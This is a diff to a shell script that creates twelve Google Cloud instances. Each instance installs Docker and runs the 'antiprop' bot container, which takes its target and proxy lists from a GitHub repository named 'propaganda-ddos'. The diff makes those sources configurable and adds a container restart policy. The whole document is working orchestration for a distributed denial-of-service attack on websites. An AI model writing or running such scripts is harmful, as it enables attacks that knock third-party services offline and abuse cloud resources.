@@ -1,7 +1,5 @@
 #!/bin/sh
 
-ZONES=(asia-east1-b asia-east1-a asia-east1-c asia-east2-a asia-east2-b asia-east2-c asia-south2-a asia-south2-b asia-south2-c asia-southeast2-a asia-southeast2-b asia-southeast2-c)
-
 botsnum=30
 if [[ $1 -ge 1 ]]; then
     botsnum=$1
@@ -10,11 +8,20 @@ else
     exit 1
 fi
 
-echo "К-сть ботів в одному кониейнері: $botsnum"
+sites="https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json"
+[[ -n "$2" ]] && sites="$2"
 
+proxy="https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json "
+[[ -n "$3" ]] && proxy="$3"
+
+echo "К-сть ботів в одному контейнері: $botsnum"
+echo "Джерела цілей: $sites"
+echo "Джерела проксі: $proxy"
+
+ZONES=(asia-east1-b asia-east1-a asia-east1-c asia-east2-a asia-east2-b asia-east2-c asia-south2-a asia-south2-b asia-south2-c asia-southeast2-a asia-southeast2-b asia-southeast2-c)
 for i in {1..12}; do 
     rand=$((RANDOM + RANDOM))
-    gcloud compute instances create antiprop${rand} --zone=${ZONES[${i}]} --custom-cpu=2 --custom-memory=1 --metadata=startup-script="#!/bin/bash
+    gcloud compute instances create antiprop${rand} --zone=${ZONES[${i}]} --custom-cpu=1 --custom-memory=1 --metadata=startup-script="#!/bin/bash
     sudo apt update
     sudo apt install --yes apt-transport-https ca-certificates curl gnupg2 software-properties-common iftop htop
     curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
@@ -24,8 +31,6 @@ for i in {1..12}; do
     sudo usermod -aG docker \$USER
     sudo service docker restart
 
-    docker run -d --rm lovefromukraine/antiprop --refresh=30 --dnsres=true --onlyproxy=false --bots ${botsnum} --checkproxy=true \
-		--sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
-		--proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
-   "; 
+    docker run --restart=always --name=antiprop -d --rm lovefromukraine/antiprop --refresh=30 \
+        --dnsres=true --onlyproxy=false --checkproxy=true --bots ${botsnum} --sites ${sites} --proxy ${proxy}"; 
 done
